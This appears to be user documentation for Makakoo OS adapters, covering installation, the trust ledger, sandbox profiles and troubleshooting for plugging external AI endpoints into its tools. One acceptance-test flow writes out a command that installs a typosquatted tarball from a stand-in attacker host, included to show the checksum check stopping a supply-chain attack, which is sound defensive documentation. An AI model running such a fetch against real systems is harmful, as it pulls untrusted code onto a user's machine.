# Adapters — Makakoo OS Universal Bridge

This doc is for **users** of Makakoo adapters — people who want to plug an external AI agent (OpenClaw, OpenRouter, Ollama, Claude API, a private pod, a custom CLI) into lope validation, Harvey chat delegation, or SANCHO swarm dispatch.

If you want to **publish** your own adapter, see `docs/adapter-publishing.md`.

---

## What is an adapter?

An adapter is one `adapter.toml` file describing how Makakoo should call an external AI endpoint. The file pins:

- **Identity** — name, version, manifest schema
- **Transport** — OpenAI-compatible HTTP, subprocess, MCP stdio/HTTP
- **Auth** — bearer, custom header, basic, or none
- **Output format** — how to turn the response into a lope-style verdict
- **Capabilities** — features, models, supported roles (validator / delegate / swarm_member)
- **Install source** — git tag, https tarball, pypi, npm, binary, or local path
- **Security** — allowlisted network hosts, sandbox profile, publisher key
- **Health probe** — URL + field assertion for install-time sanity

One adapter plugs into **three consumers** without per-consumer config:

- `lope negotiate --validators openclaw,hermes "…"`
- `makakoo adapter call openclaw` (Harvey delegation)
- Swarm dispatch (`DispatchRequest.adapter = Some("openclaw")`)

The canonical schema lives at `spec/ADAPTER_MANIFEST.md` — run `makakoo adapter spec` to dump it.

## Installing the core pack

Makakoo ships 8 reference adapters at `plugins-core/adapters/`:

| Adapter            | Transport              | Needs env                  |
| ------------------ | ---------------------- | -------------------------- |
| `openclaw`         | http://127.0.0.1:3000  | `OPENCLAW_API_KEY`         |
| `hermes`           | http://127.0.0.1:8642  | `HERMES_API_KEY`           |
| `ollama`           | http://127.0.0.1:11434 | (none — localhost)         |
| `openrouter`       | https://openrouter.ai  | `OPENROUTER_API_KEY`       |
| `claude-api`       | https://api.anthropic.com | `ANTHROPIC_API_KEY`     |
| `openai-api`       | https://api.openai.com | `OPENAI_API_KEY`           |
| `tytus-pod`        | http://10.42.42.1:18080 | `OPENAI_API_KEY` (from `tytus env`) |
| `llama-cpp-server` | http://127.0.0.1:8080  | (none — localhost)         |

Install the whole pack in one shot:

```bash
makakoo adapter install plugins-core/adapters --pack --allow-unsigned --skip-health-check
makakoo adapter list
```

`--pack` walks every `<subdir>/adapter.toml` under the given path and installs each. `--allow-unsigned` is required for local paths without a detached `.sig` file; the main `makakoo-adapters-core` GitHub distribution will ship signed manifests.

Install one at a time (bundled reference adapters):

```bash
makakoo adapter install openclaw --bundled
makakoo adapter install hermes --bundled
```

Or from a URL (signature required unless `--allow-unsigned`):

```bash
makakoo adapter install https://example.com/my-adapter.tar.gz \
    --sha256=a7f2...e9
```

## Seven user flows (acceptance tests from the v0.3 sprint)

### Flow 1 — fresh install + join lope team

```bash
makakoo adapter install openclaw --bundled
lope negotiate --validators claude,openclaw "add a retry loop to api/client.go"
```

### Flow 2 — update with capability diff triggers re-trust

```bash
makakoo adapter update openclaw        # rejects if the new manifest
                                       # added capabilities.features or
                                       # widened security.allowed_hosts
makakoo adapter update openclaw --accept-re-trust  # override
```

### Flow 3 — unsigned local adapter (dev loop)

```bash
makakoo adapter install ./my-experimental-adapter --allow-unsigned --skip-health-check
```

### Flow 4 — broken adapter after an OS upgrade

```bash
lope negotiate "…"                  # warns: adapter X unreachable
makakoo adapter status              # status table with last-ok
makakoo adapter doctor openclaw     # pass/fail per check + hints
```

### Flow 5 — swarm dispatch with adapter subagent

Programmatically (via MCP or Rust API):

```rust
let req = DispatchRequest {
    name: "openclaw-sub".into(),
    task: "research LangChain BaseLLM".into(),
    prompt: "…".into(),
    adapter: Some("openclaw".into()),
    ..Default::default()
};
gateway.dispatch(req).await?;
```

The Result artifact carries the verdict's rationale with `metadata.adapter = "openclaw"` and `metadata.status = "PASS" | "NEEDS_FIX" | "FAIL" | "INFRA_ERROR"`.

### Flow 6 — migrate legacy lope config

```bash
makakoo adapter migrate-config ~/.lope/config.json
```

Every provider entry in the legacy JSON becomes one auto-generated `adapter.toml` under `~/.makakoo/adapters/registered/`. Original JSON untouched.

### Flow 7 — supply-chain attempt foiled

```bash
makakoo adapter install https://evil.example/openc1aw.tar.gz \
    --sha256=deadbeef...
# → sha256 mismatch, install aborted
```

## Troubleshooting

| Symptom                                   | What to try                                                                                              |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `unsigned URL install rejected`           | Pass `--allow-unsigned` AND confirm interactively (URL installs without signature are risky)             |
| `manifest not found`                      | Source directory must contain a file literally named `adapter.toml` at its root                          |
| `sha256 mismatch`                         | Declared `install.sha256` doesn't match the downloaded bytes — someone tampered with the tarball         |
| `install.ref must be semver tag or SHA`   | Git sources must pin a tag (`v1.2.3`) or a 40-char commit SHA; branches are rejected by design           |
| `re-trust required`                       | The manifest's capabilities or security block changed since trust time. Review the diff, then either reject or rerun with `--accept-re-trust` |
| `no adapter named …`                      | Adapter not registered. Run `makakoo adapter list --include-bundled` to see what's shipped vs installed  |
| `health: connection refused`              | The daemon the adapter points to isn't running. Start the adapter's binary (e.g. `ollama serve`)         |
| `env: X unset`                            | The adapter's `security.requires_env` lists env vars you haven't exported. `doctor` tells you which ones |
| `sandbox: fs-read forbids write:* entries`| Adapter manifest is self-inconsistent — publisher bug. File a report, don't try to work around it        |
| Lope doesn't pick up an adapter           | Check `ls ~/.makakoo/adapters/registered/` — the manifest must be there. Confirm `LOPE_MAKAKOO_ADAPTERS` isn't set to `0` |

## Environment knobs

| Variable                    | What it does                                                                    |
| --------------------------- | ------------------------------------------------------------------------------- |
| `MAKAKOO_HOME`              | Platform home (same as kernel); unrelated to adapters home                      |
| `MAKAKOO_ADAPTERS_HOME`     | Override `~/.makakoo/adapters/` (for tests / per-project isolation)              |
| `MAKAKOO_TRUST_HOME`        | Override `~/.makakoo/trust/` (trust ledger + signing keys)                      |
| `MAKAKOO_BUNDLED_ADAPTERS`  | Override where `--bundled` resolves against (default: `plugins-core/adapters`)  |
| `MAKAKOO_BIN`               | Override which `makakoo` binary lope's `MakakooAdapterValidator` shells into    |
| `LOPE_MAKAKOO_ADAPTERS`     | Set to `0` to disable lope's 4th-tier adapter resolution                        |
| `OPENCLAW_BRIDGE_LEGACY`    | Set to `1` to force the legacy OpenClaw CLI path (bypass universal bridge)      |

## Sandbox profiles

| Profile        | Network       | Filesystem                                   | Use case                                  |
| -------------- | ------------- | -------------------------------------------- | ----------------------------------------- |
| `none`         | full          | full                                         | Dev loop only; warns when selected        |
| `network-io`   | allowlisted   | install dir + declared `write:*` entries     | Default; most adapters fit here           |
| `fs-read`      | none          | read-only host fs                            | Pure compute, no network, read config     |
| `isolated`     | none          | install dir only, no host reads              | Highest-risk adapters; bounded blast zone |

The host enforces these profiles via `sandbox-exec` on macOS and `bwrap` on Linux. On Linux without `bwrap`, the host warns and runs unsandboxed — adjust Q1 in `SPRINT.md` if your rollout demands strict isolation.

## Trust ledger

`~/.makakoo/trust/adapters.json` stores one entry per installed adapter:

```json
{
  "openclaw": {
    "manifest_hash": "sha256:51965c393c2c...",
    "version": "1.4.2",
    "trusted_at": "2026-04-21T08:21:42Z",
    "revoked": false,
    "publisher": "traylinx",
    "capabilities_snapshot": { "features": ["tool_use", "streaming", "vision"], ... },
    "security_snapshot":   { "allowed_hosts": ["127.0.0.1"], "sandbox_profile": "networkio", ... }
  }
}
```

Every `makakoo adapter update` diffs the new manifest against this snapshot. Any change in `capabilities.*` or `security.*` triggers re-trust — the Cursor-CVE class of "silent permission creep" attacks is structurally impossible under this model.

## See also

- `spec/ADAPTER_MANIFEST.md` — canonical schema v1 (or `makakoo adapter spec`)
- `docs/adapter-publishing.md` — how to write + sign + publish your own
- `development/sprints/MAKAKOO-OS-V0.3-UNIVERSAL-BRIDGE/SPRINT.md` — full rationale, security research, phase breakdown
